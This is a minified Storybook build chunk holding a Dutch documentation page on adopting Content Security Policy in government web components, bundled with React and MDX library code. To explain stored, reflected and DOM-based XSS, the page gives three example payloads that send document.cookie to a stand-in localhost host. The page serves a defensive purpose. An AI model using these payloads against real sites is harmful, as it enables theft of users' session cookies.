(self.webpackChunkuigov_web_components=self.webpackChunkuigov_web_components||[]).push([[9516],{"./node_modules/@storybook/addon-docs/dist/chunk-HLWAVYOI.mjs":(e,n,o)=>{"use strict";o.d(n,{r:()=>u});var r=o("./node_modules/react/index.js"),t=o("./node_modules/react-dom/client.js"),i=new Map,s=({callback:e,children:n})=>{let o=(0,r.useRef)();return(0,r.useLayoutEffect)(()=>{o.current!==e&&(o.current=e,e())},[e]),n},d=async(e,n)=>{let o=await l(n);return new Promise(n=>{o.render(r.createElement(s,{callback:()=>n(null)},e))})},a=(e,n)=>{let o=i.get(e);o&&(o.unmount(),i.delete(e))},l=async e=>{let n=i.get(e);return n||(n=t.createRoot(e),i.set(e,n)),n},c=o("./node_modules/@storybook/blocks/dist/index.mjs"),h={code:c.bD,a:c.Ct,...c.lO},p=class extends r.Component{constructor(){super(...arguments),this.state={hasError:!1}}static getDerivedStateFromError(){return{hasError:!0}}componentDidCatch(e){let{showException:n}=this.props;n(e)}render(){let{hasError:e}=this.state,{children:n}=this.props;return e?null:r.createElement(r.Fragment,null,n)}},u=class{constructor(){this.render=async(e,n,t)=>{let i={...h,...n?.components},s=c.WI;return new Promise((a,l)=>{o.e(9506).then(o.bind(o,"./node_modules/@storybook/addon-docs/node_modules/@mdx-js/react/index.js")).then(({MDXProvider:o})=>d(r.createElement(p,{showException:l,key:Math.random()},r.createElement(o,{components:i},r.createElement(s,{context:e,docsParameter:n}))),t)).then(()=>a())})},this.unmount=e=>{a(e)}}}},"./node_modules/@storybook/addon-docs/dist/index.mjs":(e,n,o)=>{"use strict";o.d(n,{$4:()=>r.$4,Ed:()=>r.Ed,Hw:()=>r.Hw,Uh:()=>r.Uh,Xz:()=>r.Xz,Z$:()=>r.Z$,h_:()=>r.h_}),o("./node_modules/@storybook/addon-docs/dist/chunk-HLWAVYOI.mjs");var r=o("./node_modules/@storybook/blocks/dist/index.mjs")},"./node_modules/@storybook/addon-docs/node_modules/@mdx-js/react/lib/index.js":(e,n,o)=>{"use strict";o.d(n,{NF:()=>i,Zo:()=>a,ah:()=>s,pC:()=>t});var r=o("./node_modules/react/index.js");let t=r.createContext({});function i(e){return function(n){let o=s(n.components);return r.createElement(e,{...n,allComponents:o})}}function s(e){let n=r.useContext(t);return r.useMemo(()=>"function"==typeof e?e(n):{...n,...e},[n,e])}let d={};function a({components:e,children:n,disableParentContext:o}){let i;return i=o?"function"==typeof e?e({}):e||d:s(e),r.createElement(t.Provider,{value:i},n)}},"./apps/storybook/docs/d_richtlijnen/c_csp/1_csp.stories.mdx":(e,n,o)=>{"use strict";o.r(n),o.d(n,{__namedExportsOrder:()=>c,__page:()=>d,default:()=>l}),o("./node_modules/react/index.js");var r=o("./node_modules/@storybook/addon-docs/node_modules/@mdx-js/react/lib/index.js"),t=o("./node_modules/@storybook/addon-docs/dist/index.mjs"),i=o("./node_modules/react/jsx-runtime.js");function s(e){let n=Object.assign({h1:"h1",p:"p",a:"a",h2:"h2",h3:"h3",blockquote:"blockquote",ul:"ul",li:"li",pre:"pre",code:"code"},(0,r.ah)(),e.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.h_,{title:"Richtlijnen/CSP/Content Security Policy"}),"\n",(0,i.jsx)(n.h1,{id:"content-security-policy-wip",children:"Content Security Policy (WIP)"}),"\n",(0,i.jsxs)(n.p,{children:["Zie ook de ",(0,i.jsx)(n.a,{href:"https://www.milieuinfo.be/confluence/display/FEO/CSP+compliance",target:"_blank",rel:"nofollow noopener noreferrer",children:"Confluence pagina"})," over dit onderwerp",(0,i.jsx)("br",{}),"\n  -> op te nemen op of naast deze pagina en te verwijderen uit confluence"]}),"\n",(0,i.jsx)(n.h2,{id:"inleiding",children:"Inleiding"}),"\n",(0,i.jsx)(n.p,{children:"Volgende zaken zijn er al gedaan m.b.t. CSP:"}),"\n",(0,i.jsx)(n.h3,{id:"januari-2023",children:"januari 2023"}),"\n",(0,i.jsxs)(n.p,{children:["In het kader van ticket ",(0,i.jsx)(n.a,{href:"https://www.milieuinfo.be/jira/browse/UIG-2207",target:"_blank",rel:"nofollow noopener noreferrer",children:"UIG-2207"})," zijn er beperkt zaken bekeken."]}),"\n",(0,i.jsx)(n.h3,{id:"maart-2023",children:"maart 2023"}),"\n",(0,i.jsxs)(n.p,{children:["Het volgende is gemeld op de ",(0,i.jsx)(n.a,{href:"https://www.milieuinfo.be/confluence/display/AEO/2023-03-02%3A%3A+Verslag",target:"_blank",rel:"nofollow noopener noreferrer",children:"TAW van 02/03/2023"}),"\ndoor Christophe De Blende en besproken:"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:["Ik heb zo het gevoel dat de urgentie van CSP onderschat wordt. Hier een paar statistieken van de verschillende\naanvallen die op de RP innet gecapteerd worden: ",(0,i.jsx)("a",{href:"top-threats-20221013.pdf",target:"_blank",children:"23/10/2022"}),", ",(0,i.jsx)("a",{href:"top-threats-20230213.pdf",target:"_blank",children:"23/02/2023"})," en ",(0,i.jsx)("a",{href:"top-threats-20230227.pdf",target:"_blank",children:"27/02/2023"}),".\nVan belang, al wat via SSL gebeurt zien we zelf niet. Dus er zijn veel exploits die nog niet gedetecteerd worden\nomwille van de huidige firewall / ssl terminatie setup.",(0,i.jsx)("br",{}),"\nEr is wel een tijdje een firewall loop toegevoegd geweest om log4j shell exploit te kunnen firefighten en deze\nstatistieken zijn ook meegenomen. Om aan te geven dat je met een factor 100 mag vermenigvuldigen wat je nu ziet\nin de dagdagelijkse statistieken."]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Hierbij zijn er volgende vragen / bemerkingen:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"hoe verhouden die statistieken zich tot CSP: welke zullen er verminderen / verdwijnen als CSP actief wordt ?"}),"\n",(0,i.jsx)(n.li,{children:"het 'algemeen activeren van CSP' op de reverse-proxy (wat Lode al eens geprobeerd zou hebben - op ontwikkel?) is\nniet zinvol, veel toepassingen zullen dan niet meer werken"}),"\n",(0,i.jsx)(n.li,{children:"CSP activatie zou applicatie per applicatie moeten doorgevoerd worden, omdat dit een grote doorlooptijd\n(maanden / jaren) zal hebben zouden statistieken per sub-domein uitgesplitst moeten worden om impact te kunnen zien"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"november-2023",children:"november 2023"}),"\n",(0,i.jsx)(n.p,{children:"Sinds eind 2023 worden de form componenten herschreven. We streven er naar die ineens CSP compliant te maken. We\ndoen dit o.a. door de CSP compliancy af te testen in de integrator-app."}),"\n",(0,i.jsx)(n.h3,{id:"april-2024",children:"april 2024"}),"\n",(0,i.jsx)(n.p,{children:"In de 2e helft van 2024 worden alle elementen omgezet naar volwaardige componenten. Ook deze nieuw code wordt ineens\nCSP compliant gemaakt."}),"\n",(0,i.jsx)(n.h2,{id:"csp-en-xss",children:"CSP en XSS"}),"\n",(0,i.jsxs)(n.p,{children:["Eén van de belangrijkste zaken waartegen je je kan beschermen met CSP is tegen Cross Side Scripting (XSS). Een uitleg\nvan wat XSS is vind je in het artikel ",(0,i.jsx)(n.a,{href:"https://auth0.com/blog/cross-site-scripting-xss",target:"_blank",rel:"nofollow noopener noreferrer",children:"cross site scripting xss"}),", hoe\nje je dan met CSP daartegen kan beschermen staat uitgelegd in\n",(0,i.jsx)(n.a,{href:"https://auth0.com/blog/defending-against-xss-with-csp",target:"_blank",rel:"nofollow noopener noreferrer",children:"defending against xss with csp"}),". Voor toepassingen die een SPA\nopzet volgen is er het specifiekere artikel ",(0,i.jsx)(n.a,{href:"https://auth0.com/blog/deploying-csp-in-spa",target:"_blank",rel:"nofollow noopener noreferrer",children:"deploying csp in spa"}),"."]}),"\n",(0,i.jsx)(n.h2,{id:"doelen",children:"Doelen"}),"\n",(0,i.jsx)(n.p,{children:"Het hoofddoel om CSP te activeren is om te zorgen dat een webtoepassing enkel eigen, vertrouwde code bevat en uitvoert.\nEnkel de eigen geschreven / voorziene javascript, html en css mag getoond en uitgevoerd worden. Wijzigen, tonen of\nuitvoeren van 'andere' code wordt afgeblokt. Voorbeelden hiervan zijn:"}),"\n",(0,i.jsx)(n.h3,{id:"stored-xss-tegenhouden",children:"Stored XSS tegenhouden"}),"\n",(0,i.jsx)(n.p,{children:"In input velden zou malicious code ingevoerd kunnen worden conform:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>\n"})}),"\n",(0,i.jsx)(n.p,{children:"Als deze code dan (denk bvb. in het geval van een blog) door een andere gebruiker geopend en uitgevoerd wordt kunnen er\nongewenst gegevens gecapteerd worden."}),"\n",(0,i.jsx)(n.h3,{id:"reflected-xss-tegenhouden",children:"Reflected XSS tegenhouden"}),"\n",(0,i.jsx)(n.p,{children:"Links (aangeboden via een href of verborgen via een shortening service) die refereren naar een toepassing kunnen\nscripts bevatten:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"http://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E\n"})}),"\n",(0,i.jsx)(n.h3,{id:"dom-based-xss-tegenhouden",children:"DOM based XSS tegenhouden"}),"\n",(0,i.jsx)(n.p,{children:"In de DOM kan (door via een malicious website omgeleid te zijn) geldige, maar kwaadwillige html gestoken zijn."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'<img src="noimage" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)/>\n'})}),"\n",(0,i.jsx)(n.h3,{id:"css-xss-tegenhouden",children:"CSS XSS tegenhouden"}),"\n",(0,i.jsxs)(n.p,{children:["Zie het filmpje en de presentatie op ",(0,i.jsx)(n.a,{href:"https://mikewest.org/2013/09/xss-no-the-other-s-cssconfeu-2013",target:"_blank",rel:"nofollow noopener noreferrer",children:"xss no the other s"}),"."]}),"\n",(0,i.jsx)(n.h2,{id:"csp-activeren",children:"CSP activeren"}),"\n",(0,i.jsxs)(n.p,{children:["Wat er praktisch dient te gebeuren naar deploy en configuratie toe om CSP te activeren voor de complexere\ntoepassingen wordt beschreven in ",(0,i.jsx)(n.a,{href:"https://auth0.com/blog/deploying-csp-in-spa",target:"_blank",rel:"nofollow noopener noreferrer",children:"deploying csp in spa"}),"."]}),"\n",(0,i.jsx)(n.p,{children:"Alvorens dit echter kan zullen er code wijzigingen moeten gebeuren, denk hierbij aan:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["inline javascript mag niet - alle javascript moet in aparte .js bestanden gestoken worden",(0,i.jsx)("br",{}),"\n-> de overgrote meerderheid van onze webcomponenten heeft geen inline javascript",(0,i.jsx)("br",{}),"\n-> toepassing per toepassing moet bekeken worden om dat eventueel weg te werken"]}),"\n",(0,i.jsxs)(n.li,{children:["inline styling mag niet",(0,i.jsx)("br",{}),"\n-> zowel in de webcomponenten als in toepassingen zal dit voorkomen, veel meer dan inline javascript"]}),"\n",(0,i.jsxs)(n.li,{children:["voor externe componenten moet geëvalueerd worden hoe we ze CSP gewijs kunnen gebruiken, 2 belangrijke zijn\n",(0,i.jsx)(n.a,{href:"https://www.tiny.cloud/docs/tinymce/6/tinymce-and-csp/",target:"_blank",rel:"nofollow noopener noreferrer",children:"TinyMCE"})," en de\n",(0,i.jsx)(n.a,{href:"https://www.vlaanderen.be/digitaal-vlaanderen/onze-oplossingen/mijn-burgerprofiel/global-header-en-footer",target:"_blank",rel:"nofollow noopener noreferrer",children:"global header en footer"}),"\nvan Digitaal Vlaanderen"]}),"\n"]})]})}let d=()=>{throw Error("Docs-only story")};d.parameters={docsOnly:!0};let a={title:"Richtlijnen/CSP/Content Security Policy",tags:["stories-mdx"],includeStories:["__page"]};a.parameters=a.parameters||{},a.parameters.docs={...a.parameters.docs||{},page:function(e={}){let{wrapper:n}=Object.assign({},(0,r.ah)(),e.components);return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(s,{...e})}):s(e)}};let l=a,c=["__page"]},"./node_modules/memoizerific sync recursive":e=>{function n(e){var n=Error("Cannot find module '"+e+"'");throw n.code="MODULE_NOT_FOUND",n}n.keys=()=>[],n.resolve=n,n.id="./node_modules/memoizerific sync recursive",e.exports=n},"./node_modules/react-dom/client.js":(e,n,o)=>{"use strict";var r=o("./node_modules/react-dom/index.js");n.createRoot=r.createRoot,n.hydrateRoot=r.hydrateRoot},"./node_modules/react/cjs/react-jsx-runtime.production.min.js":(e,n,o)=>{"use strict";/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var r=o("./node_modules/react/index.js"),t=Symbol.for("react.element"),i=Symbol.for("react.fragment"),s=Object.prototype.hasOwnProperty,d=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,a={key:!0,ref:!0,__self:!0,__source:!0};function l(e,n,o){var r,i={},l=null,c=null;for(r in void 0!==o&&(l=""+o),void 0!==n.key&&(l=""+n.key),void 0!==n.ref&&(c=n.ref),n)s.call(n,r)&&!a.hasOwnProperty(r)&&(i[r]=n[r]);if(e&&e.defaultProps)for(r in n=e.defaultProps)void 0===i[r]&&(i[r]=n[r]);return{$$typeof:t,type:e,key:l,ref:c,props:i,_owner:d.current}}n.Fragment=i,n.jsx=l,n.jsxs=l},"./node_modules/react/jsx-runtime.js":(e,n,o)=>{"use strict";e.exports=o("./node_modules/react/cjs/react-jsx-runtime.production.min.js")}}]);